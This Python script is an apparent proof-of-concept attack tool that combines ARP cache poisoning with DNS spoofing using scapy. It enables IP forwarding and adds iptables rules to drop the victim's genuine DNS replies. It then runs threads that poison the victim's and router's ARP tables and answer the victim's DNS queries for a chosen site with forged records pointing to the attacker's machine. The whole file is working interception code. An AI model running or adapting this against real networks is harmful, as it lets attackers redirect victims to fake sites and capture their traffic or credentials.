#!/usr/bin/python

##############################################################################################################################################################################################
# Author: Shahira A. Azhar
# Date: February 22, 2020
##############################################################################################################################################################################################


# ################################################ Imports #####################################################

# Multithreading support
from threading import *

# IP Packet manipulation
from scapy.all import *

# System
import sys

# Signal handling for program termination
import signal

# Sleep
from time import sleep

# Send commands to shell for setting iptable rules
import subprocess

# Parser for configuration file
from ConfigParser import ConfigParser

# ########################################## Helper Functions #############################################

# Signal handler for SIGINT (CTRL-C)
def sigint_handler (signum, frame):
    # Remove the iptable rules. We don't need them anymore
    for prot in ['udp', 'tcp']:
        os.system('iptables -D FORWARD -p ' + prot + ' --sport 53 -d ' + victimIP + ' -j DROP')
    print '\nCTRL-C Detected....exit'
    sys.exit(0)

# Send ARP poisoning packets
def poison(routerIP, victimIP, hostMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=hostMAC), verbose=False)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=hostMAC), verbose=False)

# Sniff out DNS requests to spoofSite and send spoofed DNS response
def spoof(pkt):
    if (pkt.haslayer(DNS)):
        # Printing only for debugging/presenting purposes
        print pkt[DNS].qd.qname
        # DNS query is for site we want to spoof
        if spoofSite in pkt[DNS].qd.qname :
            print "DNS spoofing ", spoofSite
            spoofed_dns = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, ancount=1, \
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=hostIP))
            send(spoofed_dns, verbose=False)
            # There's a bug here where we continuously send the dns spoof packets once 
            # A spoof is succesful. It doesn't break functionality so I don't care for POC
            # This sleep just makes it a little less scary looking.
            sleep(0.05)
        else:
            print "Wrong site to spoof!"
        
# ########################################## Thread #############################################

# Constructs the Spoofing Thread
class SpoofThread (Thread):
    def __init__(self, threadID, name, delay, daemon):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
        self.daemon = daemon
    
    def run(self):
     while 1:
            # Insert man in the middle (mitm) to block legitimate DNS Server
            if self.name == 'arp_spoofing':
                poison(routerIP, victimIP, hostMAC)
            # Intercept DNS queries and redirect victim to fake site 
            elif self.name == 'dns_spoofing':
                pkt = sniff(filter="host " + victimIP + " and port 53", prn=spoof, store=0)
            # Else you just sleep. Never going into that case though.
            sleep(1.5)

# ########################################## Main #############################################

# Read config parameters from file
config = ConfigParser()
config.read('config.ini')
victimIP  = config.get('MAIN', 'victimIP')
routerIP  = config.get('MAIN', 'routerIP')
hostIP    = config.get('MAIN', 'hostIP')
hostMAC   = config.get('MAIN', 'hostMAC')
spoofSite = config.get('MAIN', 'spoofSite')

def main():
    # Sets packet forwarding
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')

    # Block victim from recieiving legitimate DNS responses
    for prot in ['udp', 'tcp']:
        os.system('iptables -A FORWARD -p ' + prot + ' --sport 53 -d ' + victimIP + ' -j DROP')

    # Register the signal handlers
    signal.signal (signal.SIGINT, sigint_handler)

    # Creates the daemons
    arpThread = SpoofThread(1, 'arp_spoofing', 0, True)   
    dnsThread = SpoofThread(2, 'dns_spoofing', 0, True)
    # Start the daemons
    arpThread.start()
    dnsThread.start()
    # Loop until daemons join
    while arpThread.is_alive() or dnsThread.is_alive():
        arpThread.join(1)
        dnsThread.join(1)

if __name__ == '__main__':
      main()
